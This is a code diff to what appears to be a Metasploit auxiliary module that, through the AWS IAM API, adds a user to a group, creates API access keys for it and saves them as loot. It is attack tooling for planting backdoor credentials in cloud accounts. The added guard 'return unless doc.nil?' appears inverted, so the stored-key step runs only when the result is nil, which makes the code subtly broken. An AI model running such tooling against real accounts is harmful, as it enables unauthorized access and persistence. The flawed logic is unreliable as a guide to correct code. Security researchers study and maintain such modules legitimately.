@@ -68,15 +68,16 @@ class MetasploitModule < Msf::Auxiliary
     # add user to group
     print_status("Adding user (#{username}) to group: #{username}")
     action = 'AddUserToGroup'
-    doc = call_iam(Action => action, 'UserName' => username, 'GroupName' => username)
+    doc = call_iam('Action' => action, 'UserName' => username, 'GroupName' => username)
     print_results(doc, action)
 
     # create API keys
     print_status("Creating API Keys for #{username}")
     action = 'CreateAccessKey'
     doc = call_iam('Action' => action, 'UserName' => username)
-    print_results(doc, action)
+    doc = print_results(doc, action)
 
+    return unless doc.nil?
     path = store_loot(doc['AccessKeyId'], 'text/plain', datastore['RHOST'], doc.to_json)
     print_good("API keys stored at: " + path)
   end
